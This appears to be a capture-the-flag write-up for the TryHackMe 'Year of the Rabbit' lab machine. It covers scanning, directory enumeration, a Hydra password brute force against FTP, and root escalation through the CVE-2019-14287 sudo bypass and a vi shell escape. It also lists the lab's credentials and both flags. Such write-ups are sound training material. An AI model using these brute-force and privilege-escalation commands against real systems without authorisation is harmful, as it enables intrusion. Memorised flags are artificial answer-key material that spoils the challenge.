# Technical Writeup :- TryHackMe - Year of the Rabbit

---

## 1. Network Reconnaissance & Port Scanning
An initial port scan using Nmap was performed against ```10.48.177.158``` to identify running services and version details:
```bash
nmap -sV -sC -p- 10.48.177.158
```
Discovered Open Ports & Services:
- Port 21/tcp: FTP (```vsftpd 3.0.2```)
- Port 22/tcp: SSH (```OpenSSH 6.7p1 Debian 5```)
- Port 80/tcp: HTTP (```Apache httpd 2.4.10 (Debian)```)

## 2. Web Directory Enumeration & Hidden Endpoint Discovery
Directory brute-forcing with ```gobuster``` was executed against the root web service:
```bash
gobuster dir -u http://10.48.177.158 -w /usr/share/wordlists/dirb/common.txt
```
- Discovered Endpoint: ```/assets/``` (HTTP 301 Redirect)
- Directory Indexing: Navigating to ```[http://10.48.177.158/assets/](http://10.48.177.158/assets/)``` revealed ```style.css``` and ```RickRolled.mp4```.
- CSS Inspection: Examining ```style.css``` disclosed a developer comment pointing to a secret page:
```CSS
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_s3cr3t_fl4g.php */
```
## 3. JavaScript Redirect Bypass & Hidden Directory Discovery
Browsing directly to ```[http://10.48.177.158/sup3r_s3cr3t_fl4g.php](http://10.48.177.158/sup3r_s3cr3t_fl4g.php)``` triggered a browser alert advising to turn off JavaScript.
Inspecting the Developer Tools Network Tab revealed a 302 Redirect issued to an intermediary parameter:
```HTTP
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU
```
Navigating to ```[http://10.48.177.158/WExYY2Cv-qU/](http://10.48.177.158/WExYY2Cv-qU/)``` exposed an unlisted directory containing an image file named ```Hot_Babe.png```.

## 4. Steganography & Credential Extraction
```Hot_Babe.png``` was downloaded and analyzed locally using ```strings``` to extract hidden plain-text content embedded within the file:
```bash
strings Hot_Babe.png
```
Extracted Hint & Wordlist:
```Plaintext
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
... (82 potential passwords extracted) ...
```
## 5. FTP Brute-Forcing with Hydra
The extracted list of candidate passwords was saved to ```senhas.txt```. hydra was then executed against the target FTP service using the user account ```ftpuser```:
```bash
hydra -l ftpuser -P senhas.txt ftp://10.48.177.158 -vV
```
## 6. FTP Authentication & Exotic Cipher Decoding
Hydra successfully cracked the FTP service password for ```ftpuser```:
```bash
hydra -l ftpuser -P senhas.txt ftp://10.48.177.158 -vV
```
FTP Credentials: ```ftpuser``` : ```5iez1wGXKFpKQ```
Logging into FTP revealed a text file named ```Eli's_Creds.txt```:
```Code snippet
ftp 10.48.177.158
Name: ftpuser
Password: 5iez1wGXKFpKQ
get Eli's_Creds.txt```
```
Inspecting ```Eli's_Creds.txt``` showed content encoded in Brainfuck:
```Plaintext
+++++ ++++[ ->+++ +++++ +<]>+ +++.+ ++++ [->++ +++<] >++++ +.+<+ +[->─
...
```
Decoding the payload via an online Brainfuck interpreter revealed SSH credentials for user ```eli```:
- User: ```eli```
- Password: ```D5p01N1wAFx1d```

## 7. SSH Initial Access & Message Discovery
Using the decoded credentials, an SSH session was established as user ```eli```:
```bash
ssh eli@10.48.177.158
```
Upon login, an internal message printed to the screen:
```"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there" END MESSAGE```

Checking ```/home/gwendoline``` restricted access (```Permission denied```). Searching the system for the referenced hiding place located a secret file under ```/usr/games```:
```bash
find / -name "s3cr3t" 2>/dev/null
cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```
File Contents:
```"Your password is awful, Gwendoline. It should be at least 60 characters long! Not just MniVCQVhQHUNI Honestly!"```

## 8. Lateral Movement to User Gwendoline
Using the cleartext password obtained from the note, session context was switched to user ```gwendoline```:
```bash
su gwendoline
# Password: MniVCQVhQHUNI
whoami
# Output: gwendoline
```
Navigating to ```/home/gwendoline``` allowed reading ```user.txt```:
User Flag (```user.txt```):
```THM{1107174691af9ff3681d2b5bdb5740b1589bae53}```

## 9. Root Privilege Escalation (CVE-2019-14287 Sudo Bypass)
Checking ```sudo``` permissions for ```gwendoline``` revealed a specific configuration vulnerability:
```bash
sudo -l
```
Sudo Output:
```plaintext
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```
The specification explicitly forbids running ```vi``` as ```root``` (```!root```), but allows running it as any other arbitrary UID. This configuration is vulnerable to CVE-2019-14287, where specifying UID ```-1``` or ```4294967295``` causes ```sudo``` to evaluate the user as ```root``` (UID 0).
Executing ```vi``` using the ```-u#-1``` flag bypassed the restriction:
```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```
Inside the ```vi``` editor session, a shell was spawned by entering command mode and executing :```!/bin/bash```:
```Vim script
:!/bin/bash
```
This dropped the session directly into an interactive root shell:
```bash
whoami
# Output: root

cd /root
cat root.txt
```
Root Flag (```root.txt```):
```THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}```  
